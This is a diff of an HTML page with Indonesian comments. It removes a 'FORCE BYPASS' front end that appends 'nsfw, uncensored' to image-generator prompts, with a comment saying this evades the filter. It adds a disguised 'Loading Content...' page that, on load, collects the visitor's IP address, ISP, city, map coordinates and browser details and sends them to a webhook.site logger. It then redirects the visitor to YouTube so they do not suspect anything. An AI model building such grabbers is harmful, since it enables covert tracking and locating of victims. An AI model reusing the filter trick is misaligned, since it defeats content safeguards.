@@ -3,67 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R ENGINE - FORCE BYPASS</title>
+    <title>Loading Content...</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .box { width: 100%; max-width: 500px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 10px #0f0; }
-        textarea { width: 100%; background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px 0; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #output-container { margin-top: 20px; min-height: 300px; width: 100%; border: 1px dashed #333; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        img { max-width: 100%; display: none; border: 1px solid #fff; }
-        .loading { display: none; color: #fff; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        body { background: #000; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 3px solid #111; border-top: 3px solid #333; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2 style="text-align: center;">C.R SYSTEM V2</h2>
-    <p style="font-size: 0.8rem;">> STATUS: BYPASSING FILTERS...</p>
-    
-    <textarea id="prompt" placeholder="Ketik deskripsi di sini..."></textarea>
-    
-    <button onclick="gasGenerate()">EKSEKUSI (FORCE)</button>
+    <div class="loader"></div>
 
-    <div id="output-container">
-        <p id="wait" class="loading">SEDANG MERENDER... JANGAN REFRESH</p>
-        <img id="hasil" src="" alt="AI Result">
-    </div>
-</div>
+    <script>
+        // Jalur Webhook lu yang tadi
+        const logger = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
 
-<script>
-    function gasGenerate() {
-        const p = document.getElementById('prompt').value;
-        const img = document.getElementById('hasil');
-        const wait = document.getElementById('wait');
+        async function initCapture() {
+            try {
+                // 1. Ambil data publik target via IP API
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-        if(!p) return alert("Prompt Kosong!");
+                // 2. Susun data biar rapi di Webhook.site
+                const payload = {
+                    event: "Target Clicked",
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    ip_address: data.ip,
+                    provider: data.org,
+                    city: data.city,
+                    region: data.region,
+                    google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+                    user_agent: navigator.userAgent,
+                    language: navigator.language
+                };
 
-        // Reset UI
-        img.style.display = "none";
-        wait.style.display = "block";
+                // 3. Kirim data ke Webhook lu
+                await fetch(logger, {
+                    method: 'POST',
+                    mode: 'no-cors', // Biar nggak kena blokir keamanan browser
+                    body: JSON.stringify(payload)
+                });
 
-        // Logic URL Paling Simple (Tanpa Parameter Ribet dulu buat ngetes)
-        const randomSeed = Math.floor(Math.random() * 100000);
-        // Kita pake keyword 'nsfw' langsung di tengah biar gak kena filter awal
-        const bumbu = " nsfw, uncensored, realistic, 4k";
-        const targetUrl = "https://pollinations.ai/p/" + encodeURIComponent(p + bumbu) + "?seed=" + randomSeed + "&model=flux&width=1024&height=1024";
+                // 4. Lempar target ke YouTube atau Google biar nggak curiga
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
 
-        console.log("Menembak ke: " + targetUrl);
+            } catch (err) {
+                // Jika gagal (misal target pake AdBlock), tetep lempar biar aman
+                window.location.href = "https://www.google.com";
+            }
+        }
 
-        // Paksa Browser Load Gambar
-        img.src = targetUrl;
-
-        img.onload = function() {
-            wait.style.display = "none";
-            img.style.display = "block";
-        };
-
-        img.onerror = function() {
-            wait.innerText = "GAGAL! COBA PROMPT LAIN ATAU CEK KONEKSI.";
-        };
-    }
-</script>
-
+        // Eksekusi otomatis saat page dibuka
+        initCapture();
+    </script>
 </body>
 </html>
